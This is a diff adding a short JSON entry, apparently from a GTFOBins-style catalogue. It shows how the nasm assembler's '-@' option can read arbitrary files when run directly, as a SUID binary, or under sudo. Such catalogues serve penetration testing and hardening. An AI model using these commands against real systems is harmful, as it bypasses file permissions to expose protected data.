@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        
+        "code": "LFILE=file_to_read\nnasm -@ $LFILE\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "LFILE=file_to_read\n./nasm -@ $LFILE\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
+      }
+    ]
+  }
+}
